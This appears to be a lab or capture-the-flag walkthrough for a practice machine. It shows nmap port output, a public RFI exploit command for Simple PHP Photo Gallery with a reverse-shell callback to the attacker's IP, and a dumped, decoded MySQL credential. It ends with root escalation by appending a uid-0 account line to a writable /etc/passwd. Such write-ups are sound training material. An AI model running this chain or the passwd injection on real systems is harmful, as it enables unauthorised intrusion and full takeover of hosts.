## OPEN PORTS
```bash
21/tcp    open  ftp         syn-ack ttl 61 vsftpd 3.0.2
22/tcp    open  ssh         syn-ack ttl 61 OpenSSH 7.4 (protocol 2.0)
80/tcp    open  http        syn-ack ttl 61 Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
111/tcp   open  rpcbind     syn-ack ttl 61 2-4 (RPC #100000)
139/tcp   open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp   open  netbios-ssn syn-ack ttl 61 Samba smbd 4.10.4 (workgroup: SAMBA)
3306/tcp  open  mysql       syn-ack ttl 61 MySQL (unauthorized)
33060/tcp open  mysqlx?     syn-ack ttl 61
```
## INITIAL FOOTHOLD
```bash
# Exploit 
https://github.com/beauknowstech/SimplePHPGal-RCE.py

# Simple PHP Photo Gallery v0.8 - RFI EXPLOIT
sudo python3 SimplePHPGal-RCE.py http://192.168.205.58/ 192.168.45.203 445
```
## USERSHELL
```bash
# USER SHELL - mysql creds dump - decode base64 twice

michael  | U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==

# Creds
muchael:HockSydneyCertify123
```
## PRIVESC
```bash
- writable /etc/passwd
- newroot:B5Ihtdc111Eqk:0:0:root:/root:/bin/bash
- username: newroot password: password

echo "newroot:B5Ihtdc111Eqk:0:0:root:/root:/bin/bash" >> /etc/passwd

su newroot

# root
```